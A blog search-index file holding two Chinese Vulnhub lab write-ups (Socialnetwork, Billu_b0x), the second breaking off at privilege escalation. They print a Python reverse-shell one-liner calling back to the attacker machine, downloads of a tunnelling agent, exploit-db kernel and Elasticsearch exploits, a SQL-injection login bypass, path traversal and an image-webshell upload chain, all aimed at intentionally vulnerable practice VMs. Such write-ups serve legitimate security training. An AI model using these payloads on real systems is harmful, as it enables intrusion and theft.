<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1. Vulnhub Socialnetwork writeup</title>
    <url>/2022/03/27/1.%20Vulnhub%20Socialnetwork%20writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。将内网渗透过程中的主要知识点都涉及了，质量非常高。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</p>
<p>难度：Medium</p>
<p>虚拟机软件：Virtual Box</p>
<h1 id="虚拟机配置">虚拟机配置</h1>
<h2 id="virtual-box-下载安装">Virtual Box 下载、安装</h2>
<p>首先，去virtual box <a href="https://www.virtualbox.org/wiki/Downloads">官网</a>下载，要下载两个东西： 1. 安装包 2. 扩展包</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143744.png" /></p>
<p>记住，安装包和扩展包的版本得一致，否则扩展包无法安装。</p>
<p>下载完毕之后，先安装Virtual Box，安装完毕之后选择 <code>管理-&gt;全局设定-&gt;扩展</code> 然后选择刚刚下载好的扩展包即可。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143913.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143956.png" /></p>
<h2 id="网络配置">网络配置</h2>
<ol type="1">
<li>打开主机的 <code>网络适配器选项</code> 找到主机连接网络的网卡，然后共享到 <code>VirtualBox Host-Only Ethernet Adapter</code>。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144304.png" /></p>
<p>设置共享的时候会跳出一个对话框，里面有IP地址，要记住它。</p>
<ol start="2" type="1">
<li>回到 virtual box，<code>管理-&gt;主机网络管理器</code></li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144440.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144448.png" /></p>
<p>第一张图中的IPv4地址修改成刚刚弹出的IP地址，其他也需要对应的修改为同一网段。</p>
<ol start="3" type="1">
<li>将kali和靶机都设置为如下</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144559.png" /></p>
<p>到这一步，打开kali会发现其实无法上网，那是因为此时没有路由，输入命令 <code>route -n</code> 结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144727.png" /></p>
<p>（我涂掉的那一行应该是没有的，我后天添加上去的）</p>
<ol start="4" type="1">
<li>添加路由</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo route add default gw 192.168.137.1 （刚刚记住的IP）</span><br></pre></td></tr></table></figure>
<p>然后再次查看路由，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144914.png" /></p>
<p>此时 <code>ping baidu.com</code> 发现有数据包，成功连接外网。（每次开机都需要添加一次路由，需要永久的可以百度）</p>
<p>到此为止，配置结束。</p>
<h1 id="渗透">渗透</h1>
<p>打开kali和靶机，开始渗透。kali 的IP 为 <code>192.168.137.101</code>。</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">或者 sudo nmap 192.168.137.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145228.png" /></p>
<p>第一个是网关，第二个是主机在该网段的IP，所以第三个就是靶机的IP地址。</p>
<p>靶机IP Get！</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.102</span><br></pre></td></tr></table></figure>
<p>在渗透的过程中最好全端口扫描，不要有遗漏！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145500.png" /></p>
<p>开放端口为 22， 5000。</p>
<p>端口信息 Get！</p>
<h2 id="端口服务发现">端口服务发现</h2>
<p>知道开放端口后，扫面一下对应端口的服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 192.168.137.102</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145655.png" /></p>
<p>发现 5000 端口上的服务是 http，可能存在网页。版本信息为 <code>Werkzeug httpd 0.14.1</code> ， 用的是 python2，说明靶机存在着python环境。版本为 <code>2.7.15</code>。</p>
<p>（百度一下 Werkzeug，Werkzeug 是一个WSGI工具包，也可以作为一个Web框架的底层库。）</p>
<h2 id="访问http服务">访问http服务</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327150053.png" /></p>
<p>经过测试，只有这一个功能点，作用是将输入的内容显示出来。</p>
<p><strong>web应用程序最重要的一步就是目录扫描！</strong></p>
<h2 id="目录扫描">目录扫描</h2>
<p>推荐使用 <code>dirsearch</code>，（如果没有的话可以按照提示安装）命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dirsearch -u http://192.168.137.102:5000/</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154504.png" /></p>
<p>注意到有一个结果，访问看看</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154534.png" /></p>
<h2 id="反弹shell">反弹shell</h2>
<p>根据这个页面的提示，这里好像可以执行代码，之前的信息里说明这个环境使用python搭建的，因此尝试以下python的代码执行，可以百度一下python反弹shell的代码（修改一下kali的IP和监听端口）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.137.101&quot;</span>,<span class="number">8888</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>然后在kali上监听对应的端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155030.png" /></p>
<p>（注意，要先监听，然后再执行 python 反弹 shell 的代码，大致上可以理解 kali 开启一个服务然后让靶机来链接，如果 kali 没开就连不上）</p>
<p>成功反弹shell，运气很好，是 root。查看一下文件，发现有一个 <code>dockerfile</code> 文件。熟悉docker的应该感觉不对劲，<strong>可能这是一个docker容器，并不是真实的主机！</strong></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155120.png" /></p>
<p>查看 <code>Dockerfile</code> ，发现是docker模板文件：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155427.png" /></p>
<p>进一步怀疑当前是一个docker系统。接下来用两个方法进一步确定：</p>
<ol type="1">
<li><code>ls /.dockerenv</code>，根目录存在该文件，大概率为docker系统； <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155548.png" /></li>
<li><code>cat /proc/1/cgroup</code>，Linux初始化进程（进程id为1）的cgroup中包含着docker镜像信息的时候，可以确定是docker； <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155620.png" /></li>
</ol>
<p>查看以下IP地址，发现IP地址和kali扫描出来的不一样</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327160430.png" /></p>
<p>docker系统的这个网段可以当作是目标主机的内网网段，接下来就需要做到：</p>
<ol type="1">
<li>内网是否存在其他主机</li>
<li>哪台主机是真实的目标</li>
<li>是否存在漏洞可以利用</li>
</ol>
<h2 id="内网主机发现">内网主机发现</h2>
<p>可以通过 <code>ping</code> 只要修改最后面的数值即可，但是这里子网有16位，也就是有65535个IP地址需要测试。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 255);do ping -c 1 172.17.0.$i; done</span><br><span class="line"></span><br><span class="line">for i in $(seq 0 255);do for j in $(seq 1 255);do ping -c 1 172.17.$i.$j;done;done</span><br><span class="line">解释：双层循环，-c后面的 1 表示一个地址只发一个数据包</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327185626.png" /></p>
<p>发现内网内只有3个IP地址存活（这个脚本运行的比较慢，也可以用工具）。</p>
<p>当前IP地址是 172.17.0.2，那么接下来就需要对另外两个主机进行扫描，因为kali的工具无法直接应用在内网环境下，所以需要利用代理，将172.17.0.2作为代理对内网主机进行扫描。</p>
<h2 id="内网穿透">内网穿透</h2>
<p>内网穿透工具：<a href="https://github.com/Dliv3/Venom">venom</a></p>
<p>kali 另开一个cmd监听 9999 端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191518.png" /></p>
<p>kali 开启 http 服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8295</span><br><span class="line"></span><br><span class="line">注意：要在venom所在目录运行，换句话说，要在agent.exe在的</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191624.png" /></p>
<p>靶机从kali下载代理端，并运行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.137.101:8295/agent_linux_x64 根据靶机的操作系统选择对应的代理端</span><br><span class="line">如果提示没有文件，查看以下kali开启的http服务是否在venom目录下</span><br><span class="line"></span><br><span class="line">chmod +x agent_linux_x64</span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.137.101 -rport 9999</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327192942.png" /></p>
<p>启动 socks5 代理： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. show</span><br><span class="line">2. goto 1</span><br><span class="line">3. socks 1080 端口可以选其他的</span><br></pre></td></tr></table></figure> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327193102.png" /></p>
<p>接下来修改配置文件 <code>proxychains4.conf</code>，这样就可以让工具通过代理进行工作了，命令前要加上 <code>proxychains</code>。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line">将原来的 socks4 127.0.0.1 9050 注释</span><br><span class="line">添加：</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p>
<h2 id="内网信息收集">内网信息收集</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. proxychains4 nmap -Pn -sT 172.17.0.1</span><br><span class="line">2. proxychains4 nmap -Pn -sT 172.17.0.3</span><br></pre></td></tr></table></figure>
<p>结果分别为：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194514.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194527.png" /></p>
<p>可以看到 172.17.0.1 的端口和服务与之前扫描 192.168.137.102 的时候一模一样，所以推测，这就是真正的主机。</p>
<p>可以做一下验证，利用浏览器去访问 <code>172.17.0.1:5000</code> ，如果出现对应的页面，即可确定这就是真正的主机。</p>
<p>不过浏览器也要设置代理，（其实也可以用 <code>proxychains4 firefox</code> 来打开浏览器，但是我这里不知道为什么实现不了）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195300.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195311.png" /></p>
<p>到此，可以完全确定 <code>172.17.0.1</code> 就是真正的主机！还有 <code>172.17.0.2</code> 也需要扫描（这里是因为我们之前拿到的是webshell，扫描看一下有没有漏洞能拿到shell权限）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195702.png" /></p>
<p>发现 9200 端口打开。查看一下对应的服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195826.png" /></p>
<p><code>Elasticsearch</code> 版本为 1.4.2。可以用msf查看一下是否存在漏洞。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327200545.png" /></p>
<p>可以一个一个尝试，先尝试第一个。将exp复制到当前目录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201304.png" /></p>
<p>可以用 <code>cat 36337.py</code> 查看一下exp说明，发现是 python2 编写的。</p>
<p>执行exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201554.png" /></p>
<p>又得到一个root权限，但是我们知道，这并不是真正的目标主机，因此进行信息收集。先查看目录，发现有一个 passwords 的文件。查看其中的内容：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201855.png" /></p>
<p>密码一般都是md5加密的，故尝试将所有密码用md5解密，推荐网址：<a href="https://www.somd5.com/">MD5解密</a>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john:1337hack</span><br><span class="line">test:1234test</span><br><span class="line">admin:1111pass</span><br><span class="line">root:1234pass</span><br><span class="line">jane:1234jane</span><br></pre></td></tr></table></figure></p>
<p>想去目标主机开了 22 端口，服务为 ssh，因此尝试使用者这些账号和密码连接： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh [-p 22] john@192.168.100.102 不指定端口的话，默认就是22</span><br></pre></td></tr></table></figure></p>
<p>经尝试，发现只有 john 能够成功登录。接下来就是提权了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327202920.png" /></p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
<p>Linux提权一般优先考虑内核漏洞进行提权。从ssh连接可以看出靶机的系统为 Ubuntu 并且版本为 3.13.0，当且的版本因该是5.x。这里差了两个大更新，因此大概率存在着漏洞。用msf搜索。 <code>searchsploit linux kernel 3.13</code> 可以看到搜索出很多，真实场景的话需要一个一个尝试，这里就挑选一个 37292.c</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203630.png" /></p>
<p>复制exp到当前目录 <code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</code></p>
<p>这是c编写的，需要用 gcc 编译，但是目标主机可能没有 gcc，所以需要在kali上编译完在传到靶机。因为它是C语言写的，所以查看一下内容是否还有编译的</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203936.png" /></p>
<p>注意到，代码中还调用system，然后利用 gcc 进行编译，因此要进行修改。把相关的代码删除，然后进行编译。（删掉部分从图中第二行开始到if语句结束）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 37292.c -o a</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327205736.png" /></p>
<p>将 <code>ofs-lib.so</code> 文件也复制到相同目录，一起传到目标主机。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate ofs-lib.so</span><br><span class="line"></span><br><span class="line">如果提示：var/lib/mlocate/mlocate.db: 没有那个文件或目录。说明数据库太久没更新了，利用 updtedb 更新一下在搜索即可、</span><br><span class="line"></span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211113.png" /></p>
<p>然后开启http服务，目标主机下载这两个文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211453.png" /></p>
<blockquote>
<p>为了更好的利用exp，建议将这两个文件移到 <code>tmp</code> 目录，因为这个目录的权限一般比较多</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv * /tmp</span><br></pre></td></tr></table></figure>
<p>执行exp拿到root权限。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cd /tmp</span><br><span class="line">2. chmod +x a</span><br><span class="line">3. ./a</span><br><span class="line">4. id</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211724.png" /></p>
<p>到此为止，整个靶机的攻击过程都结束了。</p>
<h1 id="总结">总结</h1>
<p>完整的渗透过程主要有三个部分：</p>
<ol type="1">
<li>利用Web漏洞，拿到webshell，然后再拿到低权限shell；</li>
<li>权限提升，收集内网信息，确认存活主机。信息收集的越多，发现的可利用漏洞越多，第三步越容易成功；</li>
<li>依次拿到权限，最终拿到目标主机的root权限（比如域控）；</li>
</ol>
<p>该靶机给我的最大启示如下：</p>
<ol type="1">
<li>找到漏洞exp的时候不要着急的利用，先查看一下代码，代码中所利用的命令可能目标主机上并没有，所以需要在我们自己的主机上准备就绪后再传到目标主机。</li>
<li><code>/tmp</code> 权限比较多</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>11 Vulnhub Billu_b0x Writeup</title>
    <url>/2022/04/14/11%20Vulnhub%20Billu_b0x%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为中等，不过存在多种思路。肯定还有一些我没有记录到。该靶机的漏洞都比较常规，但是组合起来就有了非常好的表现！</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/billu-b0x,188/">Billu_b0x</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中（多种攻击路线）</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集（关注配置信息）</li>
<li>SQL注入（sqlmap无法得到结果）</li>
<li>文件包含漏洞</li>
<li>文件上传漏洞</li>
<li>任意文件读取漏洞</li>
<li>源码审计</li>
<li>内核漏洞提权</li>
</ul>
<p>导入虚拟机的时候，注意红框中的选择！！！否则会扫不到IP。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413121446.png" /></p>
<h1 id="渗透-1">渗透-1</h1>
<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.15</span><br><span class="line">sudo nmap -p22,80 -sV 10.0.2.15</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414190943.png" /></p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，apache2.2.22</li>
<li>靶机操作系统为Ubuntu</li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>直接访问80端口，该界面存在SQL注入，但是很难！！！常规的方法没有什么作用，不过可以通过burp爆破，需要的字典比较大，最好有pro版本跑。（我反正没做出来）</p>
<p>接下来常规的进行一下路径扫描，发现了许多东西！！！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192633.png" /></p>
<p>里面有非常多的漏洞！！！还有许多关键信息，这里先展示第一种利用方式所用到的，剩下的会在其他攻击路线中提到。</p>
<p>关注<code>test.php</code>这个文件（url中输入<code>test</code>会被定位到<code>test.php</code>），发现一句提示 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;file&#x27; parameter is empty. Please provide file path in &#x27;file&#x27; parameter</span><br></pre></td></tr></table></figure></p>
<p>经过测试发现需要用POST方式提交参数file，然后就会发现，这里存在<strong>任意文件读取漏洞</strong>！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192915.png" /></p>
<p>成功得到<code>index.php</code>的源码，当然也可以得到其他的源码或者其他文件的内容！！！</p>
<h2 id="sql注入">SQL注入</h2>
<h3 id="爆破">爆破</h3>
<p>攻击方式</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191708.png" /></p>
<p>第一个字典选择：<code>/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191738.png" /></p>
<p>第二个字典选择：（只有pro版才有）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191859.png" /></p>
<p>然后可以跑出来！</p>
<h3 id="绕过单引号过滤">绕过单引号过滤</h3>
<p>通过<code>test.php</code>的任意文件读取漏洞，得到了<code>index.php</code>的源码，直接给出关键的源码信息： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>首先关注一下查询那句代码，现在这样子明显太复杂了，我们把它简化一下。首先，因为<code>$run</code>最外面使用的是单引号，所以在内部的单引号前面需要加上转义字符。因此真正的查询语句实际如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> auth where  pass=<span class="string">&#x27;[密码]&#x27;</span> <span class="keyword">and</span> uname=<span class="string">&#x27;[账号]&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>为了方便观看，我将我们输入的部分用<code>[]</code>包括起来了，并且<code>$run</code>和头尾的单引号我都去掉了。</p>
<p>直接给出一个payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">un=or 1=1#&amp;ps=\</span><br></pre></td></tr></table></figure></p>
<p>将上述payload带入查询语句中： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> auth where pass=<span class="string">&#x27;\&#x27; and uname=&#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>分析，因为我们输入了一个<code>\</code>，使得上面语句中的第二个单引号失去了与前面单引号闭合的功能，仅仅作为一个单引号被查询。那么第一个单引号就会和第三个单引号闭合，使得<code>or 1=1</code>逃逸，然后<code>#</code>又把最后的单引号注释掉了。因此，此时查询的信息应该如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. pass = \&#x27; and uname=</span><br><span class="line">2. uname 没了</span><br></pre></td></tr></table></figure></p>
<p>因此，<code>where</code>后面的两个判断条件变成了一个，并且多了一句<code>or 1=1</code>。因为后者为1，并且是<code>or</code>，所以这句查询语句一定为真，直接登陆成功！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192522.png" /></p>
<p>直接页面输入对应的信息即可成功登录！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414193115.png" /></p>
<h2 id="文件上传和文件包含配合图片反弹shell">文件上传和文件包含配合——图片🐎反弹shell</h2>
<p>发现<code>add users</code>下面存在着文件上传漏洞，经过测试发现只能够上传后缀、<code>content-type</code>、<code>MIME</code>都为图片的文件，简单来说就是只能上传图片，但是图片的内容可以是一句话。（也可以通过<code>test.php</code>读取<code>panel.php</code>的源码）</p>
<p>接下来想着既然不能上传<code>php</code>文件，那么是否存在文件包含漏洞？如果有的话就可以两者配合实现图片🐎。</p>
<blockquote>
<p>图片🐎：后缀、MIME和Content-Type都是图片的格式，只是图片的内容是一句话木马。此时如果图片的内容能够被解析并且当作代码执行，就可以执行木马！此时木马的内容不要为POST，最好为GET，然后直接反弹shell或者写一句话到php中，然后上线蚁剑。 原因：该靶机中的加载图片马是POST中的参数load提供的，此时如果需要上线蚁剑，也需要POST提交内容，当前情况下无法实现。如果加载图片是GET完成的，那么可以同时POST提交命令，此时才可以上线蚁剑。<a href="https://hdfzzf.icu/2022/04/16/NPUCTF2020%20ReadlezPHP/">NPUCTF2020 Readl</a>中有尝试。</p>
</blockquote>
<p>我们抓取一下数据包，发现当我们切换到<code>add users</code>或者<code>show users</code>时</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195046.png" /></p>
<p>而刚刚路径扫描得到一个<code>add</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195202.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195219.png" /></p>
<p>发现两者非常类似，因此可以猜测通过<code>load=filename</code>可以包含其他文件。尝试一下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195344.png" /></p>
<p>确认存在文件包含漏洞！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果：/etc/passwd 没有效果，可以尝试以下下面的payload，绕过无法从当前目录访问的限制</span><br><span class="line">../../../../../../../../../etc/payload</span><br></pre></td></tr></table></figure>
<p>有多种方式利用图片🐎：</p>
<ul>
<li>写入命令执行代码，然后执行对应的命令；（此时也可以输入对应命令，执行后面两者）</li>
<li>往有写入权限的的目录或文件写入一句话，然后上线蚁剑</li>
<li>直接写入反弹shell的命令；</li>
</ul>
<h3 id="第一种第二种">第一种+第二种</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201033.png" /></p>
<p>必须使用<code>system</code>，<code>eval</code>没用！不知道原因！</p>
<p>然后上传，到<code>show users</code>界面就可以查看对应的图片地址</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414200103.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.15/uploaded_images/1.gif</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行：</span><br><span class="line">1. </span><br><span class="line">load=uploaded_iamges/1.gif?cmd=ls</span><br><span class="line">经尝试，不行</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">可以在panel.php?cmd=ls -l</span><br><span class="line">load=uploaded_iamges/1.gif</span><br></pre></td></tr></table></figure>
<p>注意<code>ls -l</code>需要url编码，否则无法执行！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201247.png" /></p>
<p>发现<code>uploaded_images</code>我们有全部的权限，因此直接执行命令，写入一句话</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201640.png" /></p>
<hr />
<p>也可以写入这样的命令直接反弹shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203321.png" /></p>
<p>也可以不用url编码，直接ascii码编码</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203455.png" /></p>
<hr />
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201652.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201711.png" /></p>
<p>上线成功！</p>
<h3 id="第三种">第三种</h3>
<p>直接使用<code>/usr/share/webshells/php/php-reverse-shell.php</code></p>
<p>做如下修改</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202416.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202428.png" /></p>
<p>先在kali开启监听，然后<code>load=uploaded_images/php-reverse-shell.gif</code>直接发送数据包</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202614.png" /></p>
<p>成功反弹shell！</p>
<h2 id="权限提升">权限提升</h2>
<p><code>uname -a</code></p>
